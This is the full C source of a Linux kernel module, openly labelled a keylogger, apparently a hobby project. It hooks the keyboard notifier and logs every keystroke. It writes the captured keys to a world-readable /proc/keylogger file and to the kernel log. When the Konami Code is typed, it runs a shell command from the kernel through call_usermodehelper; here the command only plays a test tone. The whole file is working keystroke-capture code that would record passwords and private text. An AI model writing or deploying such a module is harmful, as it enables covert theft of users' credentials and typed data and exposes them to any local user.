#include <linux/input-event-codes.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/timer.h>
#include <linux/io.h>
#include <linux/kmod.h>
#include <linux/workqueue.h>

#define PROC_FILENAME "keylogger"
#define MAX_KEY_LOG_SIZE 2048 // Increased buffer size

static struct notifier_block nb;
static char key_log[MAX_KEY_LOG_SIZE];
static int key_log_index = 0;
static int sequence_index = 0;

// Define the full Konami Code sequence
static const int konami_sequence[] = {
    KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN,
    KEY_LEFT, KEY_RIGHT, KEY_LEFT, KEY_RIGHT,
    KEY_B, KEY_A
};

static struct workqueue_struct *wq;
struct keylogger_execute_work {
    struct work_struct work;
};

static void execute_command_work(struct work_struct *work) {
    char *argv[] = { "/bin/sh", "-c", "speaker-test -t sine -f 1000 -l 1", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret != 0) {
        printk(KERN_ERR "Failed to execute command, return code: %d\n", ret);
    } else {
        printk(KERN_INFO "Command executed successfully.\n");
    }
    kfree(work);
}

static char get_char_from_keycode(int keycode) {
    switch (keycode) {
        case KEY_RESERVED: return ' ';
        case KEY_ESC: return '\033';
        case KEY_1: return '1';
        case KEY_2: return '2';
        case KEY_3: return '3';
        case KEY_4: return '4';
        case KEY_5: return '5';
        case KEY_6: return '6';
        case KEY_7: return '7';
        case KEY_8: return '8';
        case KEY_9: return '9';
        case KEY_0: return '0';
        case KEY_MINUS: return '-';
        case KEY_EQUAL: return '=';
        case KEY_BACKSPACE: return '\b';
        case KEY_TAB: return '\t';
        case KEY_Q: return 'q';
        case KEY_W: return 'w';
        case KEY_E: return 'e';
        case KEY_R: return 'r';
        case KEY_T: return 't';
        case KEY_Y: return 'y';
        case KEY_U: return 'u';
        case KEY_I: return 'i';
        case KEY_O: return 'o';
        case KEY_P: return 'p';
        case KEY_LEFTBRACE: return '[';
        case KEY_RIGHTBRACE: return ']';
        case KEY_ENTER: return '\n';
        case KEY_LEFTCTRL: return '\0';
        case KEY_A: return 'a';
        case KEY_S: return 's';
        case KEY_D: return 'd';
        case KEY_F: return 'f';
        case KEY_G: return 'g';
        case KEY_H: return 'h';
        case KEY_J: return 'j';
        case KEY_K: return 'k';
        case KEY_L: return 'l';
        case KEY_SEMICOLON: return ';';
        case KEY_APOSTROPHE: return '\'';
        case KEY_GRAVE: return '`';
        case KEY_LEFTSHIFT: return '\0';
        case KEY_BACKSLASH: return '\\';
        case KEY_Z: return 'z';
        case KEY_X: return 'x';
        case KEY_C: return 'c';
        case KEY_V: return 'v';
        case KEY_B: return 'b';
        case KEY_N: return 'n';
        case KEY_M: return 'm';
        case KEY_COMMA: return ',';
        case KEY_DOT: return '.';
        case KEY_SLASH: return '/';
        case KEY_RIGHTSHIFT: return '\0';
        case KEY_KPASTERISK: return '*';
        case KEY_LEFTALT: return '\0';
        case KEY_SPACE: return ' ';
        case KEY_CAPSLOCK: return '\0';
        case KEY_F1: return '\0';
        case KEY_F2: return '\0';
        case KEY_F3: return '\0';
        case KEY_F4: return '\0';
        case KEY_F5: return '\0';
        case KEY_F6: return '\0';
        case KEY_F7: return '\0';
        case KEY_F8: return '\0';
        case KEY_F9: return '\0';
        case KEY_F10: return '\0';
        case KEY_NUMLOCK: return '\0';
        case KEY_SCROLLLOCK: return '\0';
        case KEY_KP7: return '7';
        case KEY_KP8: return '8';
        case KEY_KP9: return '9';
        case KEY_KPMINUS: return '-';
        case KEY_KP4: return '4';
        case KEY_KP5: return '5';
        case KEY_KP6: return '6';
        case KEY_KPPLUS: return '+';
        case KEY_KP1: return '1';
        case KEY_KP2: return '2';
        case KEY_KP3: return '3';
        case KEY_KP0: return '0';
        case KEY_KPDOT: return '.';
        case KEY_UP: return 'U'; // Representing UP with 'U'
        case KEY_DOWN: return 'D'; // Representing DOWN with 'D'
        case KEY_LEFT: return 'L'; // Representing LEFT with 'L'
        case KEY_RIGHT: return 'R'; // Representing RIGHT with 'R'
        default: return ' ';
    }
}

static void check_sequence(int keycode) {
    if (keycode == konami_sequence[sequence_index]) {
        sequence_index++;
        if (sequence_index == ARRAY_SIZE(konami_sequence)) {
            printk(KERN_INFO "Konami Code entered: Executing command!\n");

            struct keylogger_execute_work *ew = kmalloc(sizeof(struct keylogger_execute_work), GFP_KERNEL);
            if (ew) {
                INIT_WORK(&ew->work, execute_command_work);
                queue_work(wq, &ew->work);
            } else {
                printk(KERN_ERR "Failed to allocate memory for work struct.\n");
            }
            
            sequence_index = 0; // Reset sequence
        }
    } else {
        sequence_index = 0; // Reset sequence if keycode does not match
    }
}

static int keylogger_notify(struct notifier_block *self, unsigned long event, void *data) {
    struct keyboard_notifier_param *param = data;

    if (event == KBD_KEYCODE && param->down && key_log_index < MAX_KEY_LOG_SIZE - 2) {
        char character = get_char_from_keycode(param->value);
        if (character != ' ' || (key_log_index > 0 && key_log[key_log_index - 1] != ' ')) {
            key_log[key_log_index++] = character;
            key_log[key_log_index] = '\0';
            printk(KERN_INFO "Pressed key: %c\n", character);
            
            // Check sequence
            check_sequence(param->value);
        }
    }

    return NOTIFY_OK;
}

static int keylogger_proc_show(struct seq_file *m, void *v) {
    int i;
    for (i = 0; i < key_log_index; ++i) {
        seq_putc(m, key_log[i]);
    }
    return 0;
}

static int keylogger_proc_open(struct inode *inode, struct file *file) {
    return single_open(file, keylogger_proc_show, NULL);
}

static const struct proc_ops keylogger_fops = {
    .proc_open = keylogger_proc_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

static int __init keylogger_init(void) {
    nb.notifier_call = keylogger_notify;
    register_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger module initialized.\n");

    if (!proc_create(PROC_FILENAME, 0444, NULL, &keylogger_fops)) {
        printk(KERN_ERR "Failed to create proc entry.\n");
        return -ENOMEM;
    }

    wq = create_singlethread_workqueue("keylogger_wq");
    if (!wq) {
        printk(KERN_ERR "Failed to create workqueue.\n");
        remove_proc_entry(PROC_FILENAME, NULL);
        return -ENOMEM;
    }

    printk(KERN_INFO "Keylogger proc entry created.\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    remove_proc_entry(PROC_FILENAME, NULL);
    if (wq) {
        flush_workqueue(wq);
        destroy_workqueue(wq);
    }
    printk(KERN_INFO "Keylogger module unloaded.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Piotr :)");
MODULE_DESCRIPTION("A simple keylogger with a custom command execution on Konami Code sequence.");
